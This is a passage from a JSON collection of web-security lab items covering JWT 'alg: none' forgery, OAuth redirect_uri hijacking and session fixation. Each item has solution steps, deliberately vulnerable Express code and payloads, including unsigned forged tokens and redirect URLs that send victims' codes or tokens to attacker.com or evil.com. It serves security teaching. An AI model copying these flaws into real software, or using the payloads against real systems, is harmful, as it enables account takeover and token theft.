    "Lab Description": "The application uses JWTs for stateless session management but fails to enforce proper signature verification. The JWT validation logic accepts 'alg: none', allowing tampering of token payload. To solve: Forge a JWT for user carlos with 'admin: true' and access the protected resource.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Postman to login and capture the JWT from the Authorization: Bearer header.",
      "Decode the JWT and inspect the algorithm field in the header section.",
      "Craft a new JWT with {\"alg\":\"none\"} and payload {\"username\":\"carlos\",\"admin\":true}, and remove the signature.",
      "Replace the original token with the unsigned forged token in Authorization header.",
      "Send GET /admin/dashboard and verify privileged access."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const secret = 'topsecret'; const users = { 'carlos': 'hunter2' }; app.use(express.json()); app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] === password) { const token = jwt.sign({ username, admin: false }, secret); res.json({ token }); } else { res.status(401).json({ error: 'Unauthorized' }); } }); app.get('/admin/dashboard', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const decoded = jwt.verify(token, secret, { algorithms: ['HS256', 'none'] }); if (decoded.admin) return res.send('Admin Dashboard'); res.status(403).send('Access Denied'); } catch { res.status(400).send('Invalid Token'); } }); app.listen(4001);",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyIsImFkbWluIjp0cnVlfQ.",
      "Authorization: Bearer [forged_none_algo_token]"
    ]
  },
  {
    "Lab scenario": "OAuth misconfiguration with open redirect on callback endpoint",
    "Lab Description": "The application uses OAuth for third-party login, but the redirect_uri parameter is not properly validated. This allows attackers to manipulate the OAuth flow and leak authorization codes or access tokens to malicious domains. To solve: Capture Carlos’s access token via redirect hijack and access his profile.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use OWASP ZAP to intercept the OAuth login flow and locate the redirect_uri in the authorization request.",
      "Replace redirect_uri with a malicious domain under your control (e.g., https://evil.com/callback).",
      "Send the modified OAuth login link to Carlos and trigger login via phishing or XSS.",
      "Capture the authorization code sent to your server and exchange it for an access token.",
      "Use the stolen access token in Authorization header to access /user/profile."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const axios = require('axios'); const app = express(); app.get('/auth', (req, res) => { const redirect = req.query.redirect_uri; const code = 'mock_code_123'; res.redirect(redirect + '?code=' + code); }); app.get('/callback', async (req, res) => { const code = req.query.code; try { const tokenRes = await axios.post('https://oauth-provider/token', { code }); const token = tokenRes.data.access_token; res.send('Logged in with token: ' + token); } catch { res.status(500).send('OAuth Error'); } }); app.get('/user/profile', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'carlos_oauth_token') { res.send('Carlos profile'); } else { res.status(403).send('Unauthorized'); } }); app.listen(4002);",
    "payloads": [
      "https://app.com/auth?redirect_uri=https://evil.com/callback",
      "Authorization: Bearer carlos_oauth_token"
    ]
  },
  {
    "Lab scenario": "JWT tampering via none algorithm in Authorization header",
    "Lab Description": "The application implements JWT-based authorization but does not properly validate the signing algorithm. It accepts tokens with the 'alg' field set to 'none', allowing attackers to craft unsigned tokens. The application processes JWTs sent via the 'Authorization: Bearer' header. To solve: forge a valid JWT for the user 'carlos' and access his account page.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Postman or Burp Suite to capture the Authorization header after a successful login.",
      "Decode the JWT using jwt.io or jwt_tool and observe the 'alg' value in the header section.",
      "Modify the JWT by replacing the 'alg' value with 'none', and change the payload to {\"username\":\"carlos\"}. Remove the signature completely.",
      "Send the modified token using the Authorization: Bearer header in a GET request to /my-account endpoint.",
      "Verify successful access to Carlos's account page."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const users = { carlos: 'admin123' }; app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (!decoded) return res.status(401).send('Invalid token'); const payload = jwt.verify(token, 'secret', { algorithms: ['HS256', 'none'] }); if (payload.username === 'carlos') { res.send('Welcome carlos!'); } else { res.status(403).send('Access denied'); } }); app.listen(4000);",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ICJjYXJsb3MifQ==."
    ]
  },
  {
    "Lab scenario": "Session fixation via login endpoint",
    "Lab Description": "The session ID is generated and sent to the client before authentication. Upon successful login, the same session ID is preserved instead of issuing a new one. This allows an attacker to fix a session ID for the victim. To solve: fix the session ID before Carlos logs in, then use the same session to access his account after he logs in.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to generate a session by visiting /login page before authentication and intercept the Set-Cookie response containing sessionID.",
      "Send a phishing link to Carlos that causes him to log in using that same sessionID (assume he logs in via crafted link).",
      "Once Carlos logs in, reuse the same sessionID cookie value to access /my-account endpoint.",
      "Send the sessionID in your cookie header using Burp Repeater to GET /my-account.",
      "Verify access to Carlos’s account using fixed session."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const session = require('express-session'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.use(session({ secret: 'keyboard-cat', resave: false, saveUninitialized: true })); const users = { carlos: 'secure123' }; app.get('/login', (req, res) => { res.send('<form method=\"POST\"><input name=\"username\"><input name=\"password\"><button>Login</button></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] === password) { req.session.user = username; res.send('Logged in'); } else { res.send('Invalid'); } }); app.get('/my-account', (req, res) => { if (req.session.user === 'carlos') res.send('Account details for carlos'); else res.status(403).send('Access denied'); }); app.listen(4000);",
    "payloads": [
      "Cookie: connect.sid=attackerFixedSessionID",
      "GET /my-account HTTP/1.1 with attackerFixedSessionID after victim login"
    ]
  },
  {
    "Lab scenario": "OAuth implicit flow redirection manipulation",
    "Lab Description": "The app uses OAuth implicit flow for authentication. The redirection URL validation is flawed, allowing attackers to steal tokens by injecting a malicious redirect_uri. The app accepts OAuth token from third-party providers and uses them to authenticate users via GET /oauth/callback. To solve: hijack Carlos’s token by crafting a malicious redirect_uri that sends the token to your server.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp or Postman to analyze the OAuth authorization URL parameters, especially redirect_uri.",
      "Replace the redirect_uri parameter with a malicious value pointing to your server (e.g., https://attacker.com/callback).",
      "Send the malicious link to Carlos and make him click it (assume victim interaction).",
      "Intercept the fragment token at your server from Carlos’s browser redirection.",
      "Replay the token in GET /oauth/callback?token=xyz to impersonate Carlos and access /my-account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); app.get('/oauth/callback', (req, res) => { const token = req.query.token; if (token === 'carlos_token') { res.send('Welcome back, carlos!'); } else { res.send('Invalid token'); } }); app.get('/start-auth', (req, res) => { const redirect = req.query.redirect_uri; res.redirect(`${redirect}#token=carlos_token`); }); app.listen(4000);",
    "payloads": [
      "https://vulnerable-site.com/start-auth?redirect_uri=https://attacker.com/callback",
      "https://attacker.com/callback#token=carlos_token",
      "GET /oauth/callback?token=carlos_token"
    ]
  },
  {
    "Lab scenario": "JWT Signature None Bypass in API Token Validation",
    "Lab Description": "The API backend uses JWT for authentication, but fails to validate the signature properly when the `alg` header is manipulated. The application uses the token directly from the Authorization header to identify users without verifying the token's integrity. To solve: Forge a valid JWT token that grants admin access by bypassing the signature verification logic.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Postman to intercept and inspect the Authorization Bearer token from a normal login request.",
      "Decode the JWT using jwt.io or Burp Decoder and observe the algorithm used (`alg: HS256`).",
      "Modify the JWT header to `alg: none` and remove the signature part entirely.",
      "Craft a new payload with `{ \"role\": \"admin\", \"username\": \"carlos\" }` and encode the header and payload with base64url.",
      "Replace the Authorization header with the tampered token and access the `/admin` or `/my-account` endpoint to confirm privilege escalation."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const payload = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()); if (payload.role === 'admin') { res.send('Admin access granted'); } else { res.send('User access only'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`JWT None Bypass Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyIsInJvbGUiOiJhZG1pbiJ9.",
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0."
    ]
  },
  {
    "Lab scenario": "Session Fixation in Login Token Parameter",
    "Lab Description": "The login flow uses a static session token passed in a GET parameter without proper regeneration after login. This allows a malicious actor to predetermine the victim's session ID. The application reflects the token into a cookie without regenerating it post-authentication. To solve: Fix the victim's session ID, force a login, and then reuse the session.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use OWASP ZAP to monitor the login flow and observe the use of `?session=` token in GET requests.",
      "Generate a session ID and pre-authenticate using it, confirming that it sets a `Set-Cookie: session` header with the same ID.",
      "Send the login link containing the malicious session ID to the victim.",
      "After the victim logs in using that link, reuse the same session cookie on your own browser or via Burp Repeater.",
      "Access `/my-account` with the hijacked session to confirm access to the victim's data."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); app.get('/login', (req, res) => { const session = req.query.session; res.cookie('session', session); res.send('<form method=\"POST\" action=\"/do-login\"><input name=\"user\"><input name=\"pass\"><input type=\"submit\"></form>'); }); app.post('/do-login', (req, res) => { res.redirect('/my-account'); }); app.get('/my-account', (req, res) => { if (req.cookies.session === 'fixed-session-abc') res.send('Carlos account page'); else res.send('Invalid session'); }); const PORT = 4001; app.listen(PORT, () => console.log(`Session Fixation Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "http://lab-url/login?session=fixed-session-abc",
      "Cookie: session=fixed-session-abc"
    ]
  },
  {
    "Lab scenario": "OAuth Misconfiguration in Token Exchange Endpoint",
    "Lab Description": "The lab uses an OAuth provider for authentication but fails to validate the `redirect_uri` and `client_id` parameters. This enables an attacker to manipulate the authorization flow and exchange an arbitrary `code` for a victim’s token. To solve: Hijack an access token using a rogue redirect URI and access Carlos's account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to analyze the OAuth flow and observe the exchange between `/auth`, `/callback`, and `/token`.",
      "Craft a GET request to `/auth` with a malicious `redirect_uri` pointing to your domain (e.g., https://attacker.com/callback) and a valid `client_id`.",
      "Send the link to the victim to trigger an OAuth code grant. Capture the code on your rogue redirect endpoint.",
      "Send a POST request to `/token` with the captured code and your malicious `redirect_uri`, bypassing the verification logic.",
      "Use the received access token to call `/my-account` as the victim."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); app.use(express.urlencoded({ extended: true })); const validCodes = { 'authcode123': 'token-for-carlos' }; app.post('/token', (req, res) => { const { code, redirect_uri } = req.body; if (validCodes[code]) { res.json({ access_token: validCodes[code] }); } else { res.status(400).send('Invalid code'); } }); app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'token-for-carlos') res.send('Carlos account data'); else res.status(403).send('Access denied'); }); const PORT = 4002; app.listen(PORT, () => console.log(`OAuth Token Exchange Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "GET /auth?client_id=trusted-app&redirect_uri=https://attacker.com/callback",
      "POST /token { \"code\": \"authcode123\", \"redirect_uri\": \"https://attacker.com/callback\" }",
      "Authorization: Bearer token-for-carlos"
    ]
  },
  {
    "Lab scenario": "JWT signature verification bypass in Authorization middleware",
    "Lab Description": "The application uses JWTs for session management but fails to validate the token signature correctly when the `alg` header is set to 'none'. The backend simply decodes the payload and grants access without cryptographic verification. To solve: forge a valid token for the user 'admin' and access the /admin dashboard.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept a request after logging in with a normal user using Burp Suite and extract the JWT from the Authorization header.",
      "Decode the JWT using jwt.io and observe the alg field is set to 'HS256'. Modify it to 'none'.",
      "Craft a new payload with { \"user\": \"admin\" }, set alg to 'none', and leave the signature empty.",
      "Use Postman or Burp to send a request to /admin with the forged token in the Authorization header.",
      "Verify access to the admin dashboard and check for a flag or message confirming successful privilege escalation."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const users = [{ username: 'admin', role: 'admin' }, { username: 'user1', role: 'user' }]; const jwtSecret = 'supersecretkey'; app.use((req, res, next) => { const auth = req.headers.authorization; if (auth && auth.startsWith('Bearer ')) { const token = auth.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded && decoded.header.alg === 'none') { req.user = decoded.payload; return next(); } try { req.user = jwt.verify(token, jwtSecret); return next(); } catch (e) { return res.status(401).send('Invalid token'); } } res.status(401).send('No token provided'); }); app.get('/admin', (req, res) => { if (req.user && req.user.user === 'admin') { res.send('Welcome to the admin panel'); } else { res.status(403).send('Forbidden'); } }); app.listen(3000, () => console.log('JWT Lab running on port 3000'));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.",
      "Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ."
    ]
  },
  {
    "Lab scenario": "Open redirect in OAuth flow in redirect_uri parameter",
    "Lab Description": "This lab’s OAuth implementation contains an open redirect vulnerability in the `redirect_uri` parameter. The authorization server does not validate the redirect destination properly. To solve: steal the OAuth authorization code of another user by injecting a crafted redirect_uri that forwards the code to your attacker-controlled domain.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use OWASP ZAP to proxy and observe the initial OAuth request sent to the authorization endpoint.",
      "Identify the redirect_uri parameter and test injecting a value like https://attacker.com/callback.",
      "Craft a phishing link to the victim using the modified redirect_uri to send the authorization code to your server.",
      "Deploy a basic listener (e.g., using ngrok or requestbin) and receive the stolen code.",
      "Manually exchange the stolen code for a token using Postman and access the victim’s resource."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); app.get('/auth', (req, res) => { const { redirect_uri, response_type, client_id } = req.query; if (!redirect_uri || !response_type || !client_id) { return res.status(400).send('Missing parameters'); }  const authCode = 'AUTH12345'; res.redirect(`${redirect_uri}?code=${authCode}`); }); app.listen(4000, () => console.log('OAuth Redirection Lab running on port 4000'));",
    "payloads": [
      "https://victim.com/oauth/authorize?client_id=abc&redirect_uri=https://attacker.com/callback&response_type=code",
      "https://auth.vulnapp.com/auth?client_id=test&redirect_uri=https://evil.com&response_type=code"
    ]
  },
  {
    "Lab scenario": "Session fixation vulnerability in login endpoint via cookie injection",
    "Lab Description": "The login flow does not generate a new session upon authentication. This allows attackers to set a known session ID before login, then trick a victim into logging in with it. To solve: fixate a known session ID for Carlos and access /my-account using the same session ID.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to send a GET /login request with a custom session cookie (e.g., sessionid=abc123).",
      "Trick the victim into logging in while using this same session ID (simulate or assume they log in with that session cookie).",
      "Once authenticated, use the same session ID to access the authenticated user’s /my-account page.",
      "Confirm the session contains Carlos's data without re-authentication.",
      "Verify unauthorized access to account data and session reuse confirmation."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const users = [{ username: 'carlos', password: 'supersecure' }]; let sessions = {}; app.get('/login', (req, res) => { const { username, password } = req.query; const user = users.find(u => u.username === username && u.password === password); if (user) { const sessId = req.cookies.sessionid; if (sessId) { sessions[sessId] = username; res.send('Logged in'); } else { res.status(400).send('Session ID missing'); } } else { res.send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { const user = sessions[req.cookies.sessionid]; if (user) { res.send(`Account details for ${user}`); } else { res.status(403).send('Access Denied'); } }); app.listen(5000, () => console.log('Session Fixation Lab running on port 5000'));",
    "payloads": [
      "Cookie: sessionid=attackersession",
      "GET /login?username=carlos&password=supersecure HTTP/1.1\\nCookie: sessionid=attackersession",
      "GET /my-account HTTP/1.1\\nCookie: sessionid=attackersession"
    ]
  },
  {
    "Lab scenario": "Session fixation in login flow",
    "Lab Description": "This lab contains a session fixation vulnerability in the login flow. The application reuses the session identifier set prior to authentication. The application sets a session cookie before login and does not regenerate it upon successful authentication. To solve: log in as Carlos by leveraging a fixed session identifier to hijack his session.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite Proxy to capture a request to /login and note the session cookie set before logging in.",
      "Send the GET /login request to Burp Repeater. Log out and change the session cookie to match your original session.",
      "Craft a phishing link or client-side JS that forces the victim (Carlos) to log in while having your session ID.",
      "Wait or simulate a login by Carlos using your fixed session ID.",
      "Access /my-account with the hijacked session and confirm access to Carlos’s account page."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const session = require('express-session'); const bodyParser = require('body-parser'); const app = express(); app.use(session({ secret: 'fixme', resave: false, saveUninitialized: true })); app.use(bodyParser.urlencoded({ extended: true })); const users = [{ username: 'carlos', password: 'pass123' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { req.session.authenticated = true; req.session.username = username; res.redirect('/my-account'); } else { res.send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { if (req.session.authenticated) { res.send(`Welcome back, ${req.session.username}`); } else { res.status(401).send('Unauthorized'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`Session Fixation Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "Set-Cookie: connect.sid=fixedSessionId;",
      "Phishing link: http://lab.com/login?sid=fixedSessionId",
      "Session reuse during victim login"
    ]
  },
  {
    "Lab scenario": "JWT token tampering via 'none' algorithm",
    "Lab Description": "This lab uses JSON Web Tokens (JWT) for user sessions but fails to enforce a valid signing algorithm. It accepts tokens signed with 'none', allowing users to forge tokens without a signature. To solve: Forge a JWT with 'admin' privileges and access the admin panel.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept a valid JWT using Burp Suite Proxy or Postman during a login.",
      "Decode the JWT using jwt.io and observe the algorithm is HS256.",
      "Modify the JWT header to use \"alg\":\"none\" and set payload to {\"username\":\"admin\",\"role\":\"admin\"}.",
      "Remove the signature portion of the JWT completely.",
      "Set the modified JWT in Authorization header and access /admin-panel."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const SECRET = 'topsecret'; const users = [{ username: 'admin', password: 'adminpass' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { const token = jwt.sign({ username, role: 'admin' }, SECRET, { algorithm: 'HS256' }); res.json({ token }); } else { res.status(401).send('Unauthorized'); } }); app.get('/admin-panel', (req, res) => { const token = req.headers['authorization']?.split(' ')[1]; try { const decoded = jwt.verify(token, SECRET); if (decoded.role === 'admin') { res.send('Welcome to the admin panel'); } else { res.status(403).send('Forbidden'); } } catch { res.status(401).send('Invalid token'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`JWT None Algorithm Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "Header: {\"alg\":\"none\",\"typ\":\"JWT\"}",
      "Payload: {\"username\":\"admin\",\"role\":\"admin\"}",
      "JWT: <base64(header)>.<base64(payload)>."
    ]
  },
  {
    "Lab scenario": "OAuth misconfiguration with open redirect in redirect_uri",
    "Lab Description": "This lab implements OAuth 2.0 login using a third-party provider but fails to validate redirect_uri properly. An attacker can inject an external redirect to exfiltrate tokens. To solve: Steal an access token by exploiting an open redirect and use it to access Carlos’s profile page.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use OWASP ZAP or Burp to capture the OAuth authorization URL.",
      "Modify the redirect_uri parameter to point to a domain you control (e.g., https://attacker.com/callback).",
      "Send a phishing link to the victim or simulate their login flow.",
      "Receive the access token on your callback endpoint.",
      "Replay the token to /profile using Authorization: Bearer <stolen_token> to access Carlos’s profile."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const axios = require('axios'); const app = express(); const CLIENT_ID = 'abc123'; const REDIRECT_URIS = ['http://localhost:4000/callback']; app.get('/auth', (req, res) => { const redirect = req.query.redirect_uri; res.redirect(`https://oauth.provider.com/auth?client_id=${CLIENT_ID}&redirect_uri=${redirect}`); }); app.get('/callback', async (req, res) => { const { code } = req.query; const token = await axios.post('https://oauth.provider.com/token', { code }); res.send('Logged in with token: ' + token.data.access_token); }); app.get('/profile', (req, res) => { const auth = req.headers['authorization']; if (auth === 'Bearer supersecrettoken') { res.send('Carlos profile page'); } else { res.status(403).send('Access denied'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`OAuth Redirect Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "https://lab.com/auth?redirect_uri=https://attacker.com/callback",
      "Captured Token: Bearer supersecrettoken",
      "Phishing link with poisoned redirect_uri"
    ]
  },
  {
    "Lab scenario": "Session Fixation in REST-based login flow",
    "Lab Description": "This lab implements RESTful authentication via session cookies but fails to regenerate the session ID upon successful login. The application incorrectly trusts session state established prior to login. To solve: Fixate a session for Carlos and gain access to his account page.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use OWASP ZAP to initiate an unauthenticated session and capture the Set-Cookie header from GET /login",
      "Send multiple GET requests to confirm session ID is reused even after login",
      "Use Postman to manually log in as carlos while reusing the fixated session ID",
      "Observe that authentication completes without regenerating session ID, giving access",
      "Send GET /my-account with the fixated cookie and confirm access to Carlos's account"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const session = require('express-session'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); app.use(session({ secret: 'supersecret', resave: false, saveUninitialized: true })); const users = [{ username: 'carlos', password: 'carlospass' }]; app.get('/login', (req, res) => { res.send('Login page'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { req.session.user = username; res.send('Logged in'); } else { res.status(401).send('Unauthorized'); } }); app.get('/my-account', (req, res) => { if (req.session.user === 'carlos') res.send('Carlos Account Access'); else res.status(403).send('Forbidden'); }); app.listen(4000);",
    "payloads": [
      "Session-ID reuse before and after POST /login",
      "GET /my-account with fixated session cookie",
      "POST /login with valid creds and pre-injected JSESSIONID"
    ]
  },
  {
    "Lab scenario": "JWT None Algorithm Authentication Bypass",
    "Lab Description": "The app uses JSON Web Tokens for user sessions but fails to validate the JWT signature algorithm properly. It accepts unsigned tokens if 'alg' is set to 'none'. To solve: Modify the JWT to impersonate Carlos without a valid signature and access the protected resource.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to capture a valid JWT token from your account login response",
      "Decode the token using jwt.io and observe the 'alg' header is RS256",
      "Replace 'alg' with 'none' and change 'sub' or 'username' field to carlos",
      "Strip the signature and construct a new token with header.payload.",
      "Send the tampered token in Authorization: Bearer header and access /account"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const users = [{ username: 'carlos', password: 'jwtpass' }]; const privateKey = 'PRIVATE_KEY'; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { const token = jwt.sign({ username }, privateKey, { algorithm: 'RS256' }); res.json({ token }); } else { res.status(401).send('Invalid login'); } }); app.get('/account', (req, res) => { const auth = req.headers['authorization']; const token = auth?.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded.payload.username === 'carlos') res.send('Welcome Carlos'); else res.status(403).send('Access Denied'); }); app.listen(4000);",
    "payloads": [
      "JWT with header: {\"alg\":\"none\"}",
      "Payload: {\"username\":\"carlos\"}",
      "Authorization: Bearer header with unsigned JWT"
    ]
  },
  {
    "Lab scenario": "OAuth Misconfiguration with Open Redirect in Callback",
    "Lab Description": "This app uses OAuth2 with an authorization code grant flow. However, the redirect_uri parameter is not properly validated, allowing redirection to attacker-controlled domains. To solve: Steal the authorization code of Carlos via a crafted OAuth login URL and gain access to his token-protected account page.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept the OAuth redirect URL during login initiation",
      "Modify the redirect_uri to point to your public request bin or attacker server",
      "Send the crafted OAuth login link to the victim (Carlos)",
      "Capture the authorization code redirected to your server",
      "Exchange the stolen code for an access token and use it to call /account"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const querystring = require('querystring'); const app = express(); app.get('/auth', (req, res) => { const { redirect_uri } = req.query; const authCode = 'auth123'; res.redirect(redirect_uri + '?code=' + authCode); }); app.get('/token', (req, res) => { const { code } = req.query; if (code === 'auth123') res.json({ access_token: 'token-for-carlos' }); else res.status(403).send('Invalid code'); }); app.get('/account', (req, res) => { const token = req.headers['authorization']?.split(' ')[1]; if (token === 'token-for-carlos') res.send('Carlos OAuth Account'); else res.status(401).send('Unauthorized'); }); app.listen(4000);",
    "payloads": [
      "https://example.com/auth?client_id=123&redirect_uri=https://attacker.com/callback",
      "Captured code=auth123 from callback",
      "GET /token?code=auth123 -> extract access_token",
      "Authorization: Bearer token-for-carlos"
    ]
  },
  {
    "Lab scenario": "Session fixation vulnerability in login endpoint",
    "Lab Description": "The login functionality improperly trusts pre-authentication session tokens. The application fails to issue a new session identifier upon successful login. To solve: fixate a session ID before login and use it to access Carlos’s account.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to capture the GET /login request before any login attempt.",
      "Observe that a session cookie (e.g., sessionId) is already issued before login.",
      "Send the login request for Carlos using valid credentials via Burp Repeater with the fixed sessionId still active.",
      "After successful login, reuse the same sessionId and send a GET request to /account.",
      "Verify successful account access via the authenticated session with the fixed session ID."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const users = [{ username: 'carlos', password: 'letmein' }]; app.get('/login', (req, res) => { res.cookie('sessionId', 'static-session-id'); res.send('Login page'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { res.send('Logged in'); } else { res.status(401).send('Invalid credentials'); } }); app.get('/account', (req, res) => { if (req.cookies.sessionId === 'static-session-id') res.send('Carlos account page'); else res.status(403).send('Access denied'); }); const PORT = 4000; app.listen(PORT, () => console.log('Session Fixation Lab running on http://localhost:' + PORT));",
    "payloads": [
      "Pre-assign sessionId=static-session-id before login",
      "Send POST /login with credentials and fixed sessionId",
      "Reuse fixed sessionId to access /account"
    ]
  },
  {
    "Lab scenario": "JWT tampering vulnerability in token verification endpoint",
    "Lab Description": "The application uses JSON Web Tokens (JWT) for authentication but fails to validate the algorithm field securely. The server accepts tokens with the algorithm set to 'none', leading to authentication bypass. To solve: forge a valid JWT that grants admin access without a signature.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Postman to capture a valid JWT token from the Authorization header after a successful login.",
      "Decode the token using jwt.io and examine the payload and algorithm fields.",
      "Modify the payload to { \"username\": \"carlos\", \"role\": \"admin\" } and set the algorithm to 'none'.",
      "Remove the signature portion entirely and re-encode the header and payload using base64url.",
      "Use Postman to send a request with the forged token in the Authorization header and access /admin."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const secret = 'supersecret'; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username, role: 'user' }, secret); res.json({ token }); }); app.get('/admin', (req, res) => { const token = req.headers['authorization'].split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded.payload.role === 'admin') { res.send('Welcome Admin'); } else { res.status(403).send('Forbidden'); } }); const PORT = 4000; app.listen(PORT, () => console.log('JWT None Algorithm Lab running on http://localhost:' + PORT));",
    "payloads": [
      "Header: {\"alg\":\"none\",\"typ\":\"JWT\"}",
      "Payload: {\"username\":\"carlos\",\"role\":\"admin\"}",
      "JWT: base64url(header) + '.' + base64url(payload) + '.'"
    ]
  },
  {
    "Lab scenario": "OAuth misconfiguration in implicit grant flow",
    "Lab Description": "The OAuth implementation uses the implicit flow with weak redirect URI validation, enabling token theft via open redirection. The application trusts redirect URIs from user input. To solve: craft a malicious redirect to steal Carlos’s access token.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to capture the initial OAuth request flow on login.",
      "Notice the redirect_uri parameter is weakly validated against an allowlist.",
      "Craft a new OAuth request with a redirect_uri pointing to a malicious site (e.g., https://attacker.com#access_token=...).",
      "Send the modified OAuth URL to Carlos or simulate a login as Carlos if credentials are known.",
      "Capture the access token from the redirect and use it to access Carlos’s data via the /userinfo endpoint."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const tokens = { 'carlos-token': 'carlos' }; app.get('/authorize', (req, res) => { const { response_type, client_id, redirect_uri } = req.query; if (response_type === 'token') { const token = 'carlos-token'; res.redirect(redirect_uri + '#access_token=' + token); } else { res.status(400).send('Unsupported flow'); } }); app.get('/userinfo', (req, res) => { const token = req.headers['authorization']?.split(' ')[1]; if (tokens[token]) res.send('User data for ' + tokens[token]); else res.status(403).send('Invalid token'); }); const PORT = 4000; app.listen(PORT, () => console.log('OAuth Misconfig Lab running on http://localhost:' + PORT));",
